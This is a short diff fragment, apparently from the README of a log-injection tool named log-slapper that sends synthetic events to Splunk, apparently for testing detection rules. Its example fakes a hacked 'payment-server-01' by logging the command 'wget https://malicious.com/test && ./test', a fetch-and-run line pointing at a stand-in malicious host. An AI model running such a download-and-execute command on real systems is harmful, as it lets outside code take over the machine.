@@ -34,3 +34,4 @@ send log as "payment-server-01" got hacked and malicious code is running:
 ./log-slapper nix_command --hostname "payment-server-01" --ip "23.32.45.123" -t "e270e632-861f-45cc-8f00-f91eb895f5e6" --exectime "10/10/2021 08:45" --command "wget https://malicious.com/test && ./test"
 ```
 
+Now check your Splunk 🙂
